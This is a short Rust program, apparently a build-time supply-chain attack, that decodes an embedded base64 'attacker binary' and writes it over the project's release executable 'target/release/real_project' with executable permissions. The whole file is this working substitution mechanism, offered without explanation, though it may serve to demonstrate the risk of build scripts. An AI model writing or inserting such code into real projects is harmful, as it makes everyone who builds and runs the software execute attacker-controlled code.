use std::fs::{self, File};
use std::io::prelude::*;
use std::io::Result;
use std::os::unix::prelude::PermissionsExt;
use base64::decode;

const ATTACKER_BINARY: &str = include_str!("base64_attacker_binary");

fn main() -> Result<()> {
    let attacker_binary = decode(ATTACKER_BINARY).unwrap();
    let mut file = File::create("target/release/real_project")?;
    file.write_all(attacker_binary.as_slice())?;
    file.set_permissions(fs::Permissions::from_mode(0o775))?;
    Ok(())
}